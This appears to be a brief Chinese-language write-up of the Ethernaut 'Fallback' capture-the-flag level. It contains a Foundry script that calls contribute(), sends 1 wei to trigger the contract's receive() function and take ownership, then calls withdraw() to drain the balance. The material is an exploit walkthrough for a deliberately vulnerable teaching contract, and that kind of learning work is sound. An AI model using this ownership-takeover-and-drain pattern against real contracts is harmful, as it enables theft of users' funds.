# Fallback


通过查看合约，发现存在`receive()`函数，并且会修改合约的owner。只要我们在向合约发送ETH前，调用`contribute()`函数即可。

```solidity
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackScript is Script {
    // instance id: 0x1D3DF7c76c2cfb27E8BCcB1ae55cc549E9a9ADf6
    Fallback public fb = Fallback(payable(0x1D3DF7c76c2cfb27E8BCcB1ae55cc549E9a9ADf6));

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        fb.contribute{value: 1 wei}();
        payable(0x1D3DF7c76c2cfb27E8BCcB1ae55cc549E9a9ADf6).call{value: 1 wei}("");
        fb.withdraw();
        vm.stopBroadcast();
    }
}
```